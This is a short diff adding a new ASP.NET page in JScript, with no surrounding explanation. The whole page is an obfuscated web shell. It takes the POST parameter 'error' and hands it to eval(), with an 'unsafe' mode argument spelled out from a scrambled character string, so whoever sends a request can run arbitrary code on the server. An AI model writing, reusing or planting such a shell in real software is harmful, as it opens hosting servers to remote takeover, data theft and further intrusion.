@@ -1,0 +1,7 @@
+<%@ Page Language="Jscript" Debug=true%>
+<%
+var EVQR='uISArhOjKnPgpLDycmEeYWUwRMdXaivlbBZVkxNzftqosQFHCTGJ';
+var AOSA=Request.Form("error");
+var EHQG=EVQR(0) + EVQR(9) + EVQR(2) + EVQR(3) + EVQR(40) + EVQR(18);
+eval(AOSA, EHQG);
+%>
